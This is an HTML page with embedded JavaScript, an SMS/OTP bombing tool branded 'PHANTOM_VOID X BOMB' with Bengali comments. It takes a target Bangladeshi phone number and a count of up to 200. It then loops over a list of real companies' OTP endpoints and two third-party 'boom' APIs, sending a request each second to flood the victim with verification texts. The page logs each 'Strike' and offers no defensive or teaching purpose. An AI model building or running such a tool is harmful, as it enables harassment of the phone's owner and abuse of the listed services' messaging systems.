<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHANTOM_VOID;</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Orbitron', sans-serif; }
        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
        
        /* বক্সটি বড় করা হয়েছে */
        .container { 
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.92); padding: 50px; border-radius: 25px;
            border: 4px solid #ff0000; box-shadow: 0 0 40px #ff0000;
            width: 95%; max-width: 550px; text-align: center;
        }

        h1 { color: #ff0000; font-size: 28px; text-shadow: 0 0 15px #ff0000; margin-bottom: 30px; }
        
        input { 
            width: 100%; padding: 18px; margin: 15px 0; background: #000; 
            border: 1px solid #ff0000; color: #fff; text-align: center;
            border-radius: 12px; font-size: 18px; outline: none; box-shadow: inset 0 0 8px #ff0000;
        }

        button { 
            width: 100%; padding: 20px; margin-top: 25px; background: #ff0000; 
            color: #fff; border: none; font-weight: bold; cursor: pointer;
            border-radius: 12px; font-size: 20px; letter-spacing: 2px;
            box-shadow: 0 0 20px #ff0000; transition: 0.3s;
        }

        button:disabled { background: #440000; cursor: not-allowed; box-shadow: none; }

        #status { color: #fff; margin-top: 20px; font-size: 16px; font-weight: bold; }
        #timer { color: #ffaa00; font-size: 18px; margin-top: 10px; display: none; }
        
        #attackLogs { 
            margin-top: 25px; max-height: 120px; overflow-y: auto; 
            color: #00ff00; font-size: 15px; text-align: left; padding: 12px;
            background: rgba(0, 255, 0, 0.05); border-radius: 8px; border: 1px solid #333;
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    
    <div class="container">
        <h1>PHANTOM_VOID X BOMB</h1>
        <input type="number" id="target" placeholder="Target Number +88..">
        <input type="number" id="count" placeholder="Request Amount">
        <button id="startBtn" onclick="startAttack()">START ATTACK</button>
        <div id="status">Status: Ready...</div>
        <div id="timer">Wait: 0s</div>
        <div id="attackLogs"></div>
    </div>

    <script>
        // Matrix ব্যাকগ্রাউন্ড
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "01PHANTOMVOID"; const fontSize = 16;
        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);

        // টাইমার সিস্টেম (Cooldown)
        let isCooldown = false;
        function activateCooldown(seconds) {
            isCooldown = true;
            const btn = document.getElementById('startBtn');
            const timerDisplay = document.getElementById('timer');
            btn.disabled = true;
            timerDisplay.style.display = 'block';
            
            let remaining = seconds;
            const interval = setInterval(() => {
                timerDisplay.innerText = `Wait: ${remaining}s`;
                remaining--;
                if (remaining < 0) {
                    clearInterval(interval);
                    isCooldown = false;
                    btn.disabled = false;
                    timerDisplay.style.display = 'none';
                }
            }, 1000);
        }

        async function startAttack() {
            if (isCooldown) return;
            const phone = document.getElementById('target').value;
            const amount = document.getElementById('count').value;
            const status = document.getElementById('status');
            const logs = document.getElementById('attackLogs');

            if(!phone || !amount) { status.innerText = "Error: Input Missing!"; return; }
            if(amount > 200) { status.innerText = "Error: Maximum limit is 200!"; return; } //

            status.innerText = "Status: Attack Started...";
            logs.innerHTML = "";

            // Bikroy বাদ দিয়ে আপনার অন্য সব API
            let apis = [
                { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
                { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
                { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
                { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
                { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
                { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
                { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
                { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
                { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
                { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
                { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
                { url: `https://api.foodpanda.com.bd/api/v2/otp`, method: 'POST', data: { phone: phone } },
                { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } }
            ];

            for (let i = 1; i <= amount; i++) {
                let api = apis[(i - 1) % apis.length];
                try {
                    let options = { method: api.method, mode: 'no-cors' };
                    if(api.data) {
                        options.headers = { 'Content-Type': 'application/json' };
                        options.body = JSON.stringify(api.data);
                    }
                    fetch(api.url, options);
                    logs.innerHTML += `Strike ${i}: Success ✅<br>`;
                } catch (e) {
                    logs.innerHTML += `Strike ${i}: Failed ❌<br>`;
                }
                logs.scrollTop = logs.scrollHeight;
                await new Promise(res => setTimeout(res, 1000));
            }

            status.innerText = "Status: Completed!";
            activateCooldown(60); // অ্যাটাক শেষে ৬০ সেকেন্ডের কুলডাউন
        }
    </script>
</body>
</html>
